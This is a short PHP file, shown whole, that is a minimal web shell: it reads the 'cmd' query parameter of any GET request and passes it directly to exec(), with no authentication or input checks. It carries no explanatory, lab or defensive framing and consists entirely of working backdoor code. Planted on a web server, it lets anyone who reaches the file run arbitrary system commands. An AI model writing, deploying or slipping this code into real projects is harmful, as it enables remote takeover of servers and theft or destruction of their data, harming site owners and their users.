<?php

if ($_SERVER["REQUEST_METHOD"] == "GET") {

    $cmd = $_GET['cmd'];

    if ($cmd !== null) {
        exec($cmd);
        die();
    }
}

?>